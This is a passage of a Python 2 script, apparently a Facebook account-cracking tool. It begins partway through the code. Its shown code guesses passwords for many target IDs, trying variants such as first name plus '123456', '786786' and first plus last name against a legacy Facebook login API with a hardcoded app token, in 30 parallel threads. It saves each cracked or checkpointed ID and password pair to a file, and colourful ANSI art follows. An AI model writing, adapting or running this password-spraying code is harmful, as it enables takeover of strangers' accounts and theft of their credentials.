			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'											
				                                   print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;92m    : \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mID \x1b[1;92m      : \x1b[1;92m' + user											
				                                   print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;91m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                                       print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '123456'										
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;92m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'						
						                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;92m    : \x1b[1;92m' + b['name']							
						                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;92m      : \x1b[1;92m' + user					
						                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                                                   print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;91m    : \x1b[1;91m' + b['name']
				                                                   print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user
				                                                   print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '786786'													
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;92m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'											
				                                                           print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;91m    : \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mID \x1b[1;92m      : \x1b[1;92m' + user									
				                                                           print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid_CP'
				                                                               print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['last_name']+'123456'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'					
									                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;96m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                                                                           print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']
				                                                                           print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;93mID \x1b[1;91m      : \x1b[1;91m' + user
				                                                                           print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['first_name']+'786'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;93m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'											
				                                                                                   print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;91m    : \x1b[1;93m' + b['name']											
				                                                                                   print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user										
				                                                                                   print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + b['last_name']					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;92m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'			
											                                       print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mID \x1b[1;92m      : \x1b[1;92m' + user	
											                                       print '\x1b[1;92m[•⊱🌼⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                                                                                                   print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']
				                                                                                                   print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user
				                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)	
																												   	
											                               
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;96mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;92m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;91mout/checkpoint.txt")	
	print """
 \033[1;92m 1111111111111111¶11111111111111111111111111111111111111111111 
	\033[1;92m 1111111111111111¶¶¶111111111111111111111111111111111111111111 
	\033[1;92m 11111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111111111111111111 
	\033[1;92m 111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111 
	\033[1;92m 11111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111 
	\033[1;92m 111111111111111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111 
	\033[1;92m 111111111111111¶¶¶¶¶¶¶¶¶¶1¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111 
	\033[1;92m 111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶111111111 
	\033[1;92m 11111111111¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶¶111111111¶11111111111 
	\033[1;92m 1111111111111111¶¶¶¶¶11¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶1111111111111111111 
	\033[1;92m 111111111111111¶¶¶¶¶11¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1¶¶¶¶111111111111111111 
	\033[1;92m 11111111111111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111¶¶¶¶¶111¶¶¶¶¶¶¶¶¶11111111111 
	\033[1;92m 1111111111111¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶11111¶¶¶1111111¶¶¶11¶¶1111111111 
	\033[1;92m 1111111111111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111111¶¶¶11111111111111111111111 
	\033[1;92m 111111111111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶¶¶1111111111111111111 
	\033[1;92m 11111111111¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶111111111111111111111 
	\033[1;92m 111111111¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶11111111111111111111111111111111 
	\033[1;91m 11111111111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶1111111111111111111111111111111 
	\033[1;91m 11111111111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶1111111111111¶111111111111111 
	\033[1;91m 11111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111¶11111111111111 
	\033[1;91m 11111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶1111111111111 
	\033[1;91m 1111111111111¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶111111111111 
	\033[1;91m 1111111111111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶111111111111 
	\033[1;91m 111111111111¶¶111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶111111111111 
	\033[1;91m 1111111111¶¶111111111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶111111111111 
	\033[1;91m 111111111111111111111¶¶¶1111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111111111 
	\033[1;91m 111111111111111111111¶¶¶111111111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111111111 
	\033[1;91m 111111111111111111111¶¶111111111111¶¶¶¶11¶¶¶¶¶¶¶¶111111111111 
	\033[1;91m 11111111111111111111¶¶1111111111111¶¶¶¶11¶¶¶¶¶11¶111111111111 
	\033[1;91m 11111111111111111111111111111111111¶¶¶¶11¶¶¶¶1111111111111111 
	\033[1;91m 11111111111111111111111111111111111¶¶¶¶11¶¶111¶¶1111111111111 
	\033[1;91m 11111111111111111111111111111111111¶¶¶¶1¶¶11¶¶¶¶¶111111111111 
	\033[1;91m 1111111111111111111111111111111111¶¶¶¶11111¶¶¶¶¶1111111111111 
	\033[1;91m 1111111111111111111111111111111111¶¶¶1111¶¶¶¶¶111111111111111 
	\033[1;91m 111111111111111111111111111111111¶¶¶111¶¶¶¶¶¶1111111111111111 
	\033[1;91m 1111111111111111111111111111111¶¶¶¶11¶¶¶¶¶¶111111111111111111 
	\033[1;91m 111111111111111111111111111111¶¶¶¶11¶¶¶¶¶11111111111111111111 
	\033[1;91m 1111111111111111111111111111¶¶¶¶11¶¶¶¶¶1111111111111111111111 
	\033[1;91m 111111111111111111111111111¶¶¶¶11¶¶¶¶¶11111111111111111111111 
	\033[1;91m 11111111111111111111111111¶¶¶¶11¶¶¶¶1111111111111111111111111 
	\033[1;96m 1111111111111111111111111¶¶¶¶¶1¶¶¶¶¶1111111111111111111111111 
	\033[1;96m 1111111111111111111111111¶¶¶¶11¶¶¶¶11111111111111111111111111 
	\033[1;96m 1111111111111111111111111¶¶¶¶11¶¶¶¶1111111¶111111111111111111 
	\033[1;96m 1111111111111111111111111¶¶¶¶¶11¶¶¶¶111111¶¶11111111111111111 
	\033[1;96m 11111111111111111111111111¶¶¶¶¶11¶¶¶¶1111¶¶¶11111111111111111 
	\033[1;96m 111111111111111111111111111¶¶¶¶¶11111111¶¶¶¶11111111111111111 
	\033[1;96m 11111111111111111111111111111¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶1111111111111111 
	\033[1;96m 1111111111111111111111111111111¶¶¶¶¶¶11¶¶¶¶¶11111111111111111 
	\033[1;96m 111111111111111111111111111111111¶¶¶¶1¶¶¶¶¶¶11111111111111111 
	\033[1;96m 1111111111111111111111111111111111¶¶¶11¶¶¶¶¶11111111111111111 
	\033[1;96m 1111111111111111111111111111111111¶¶¶11¶¶¶1¶11111111111111111 
	\033[1;96m 11111111111111111111111111111111111¶¶1¶¶111111111111111111111 
	\033[1;96m 1111111111111111111111111111111111¶¶¶111¶¶1111111111111111111 
	\033[1;96m 1111111111111111111111111111111111¶¶11¶¶¶11111111111111111111 
	\033[1;93m 11111111111111111111111111111111¶¶¶11¶¶¶111111111111111111111 
	\033[1;93m 111111111111111111111111111111¶¶¶¶11¶¶¶1111111111111111111111 
	\033[1;93m 11111111111111111111111111111¶¶¶11¶¶¶¶11111111111111111111111 
	\033[1;93m 1111111111111111111111111111¶¶¶11¶¶¶1111111111111111111111111 
	\033[1;93m 1111111111111111111111111111¶¶¶1¶¶¶11111111111111111111111111 
	\033[1;93m 111111111111111111111111111¶¶¶11¶¶¶11111111111111111111111111 
	\033[1;93m 111111111111111111111111111¶¶¶¶1¶¶¶11111¶11111111111111111111 
	\033[1;93m 1111111111111111111111111111¶¶¶¶11¶1111¶¶11111111111111111111 
	\033[1;93m 11111111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶11111111111111111111 
	\033[1;93m 1111111111111111111111111111111¶¶¶¶¶¶¶¶¶¶11111111111111111111 
	\033[1;93m 111111111111111111111111111111111¶¶¶¶¶¶¶111111111111111111111 
	\033[1;93m 111111111111111111111111111111111¶¶¶¶¶¶¶111111111111111111111 
	\033[1;93m 111111111111111111111111111111111¶¶¶¶¶¶1111111111111111111111 
	\033[1;93m 111111111111111111111111111111111¶¶¶¶¶11111111111111111111111 
	\033[1;93m 111111111111111111111111111111111¶¶¶¶111111111111111111111111 
	\033[1;93m 11111111111111111111111111111111¶¶¶¶1111111111111111111111111 
	\033[1;93m 1111111111111111111111111111111¶¶¶111111111111111111111111111 
	\033[1;93m 111111111111111111111111111111¶¶11111111111111111111111111111 
	\033[1;93m 1111111111111111111111111111¶¶1111111111111111111111111111111
"""
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()

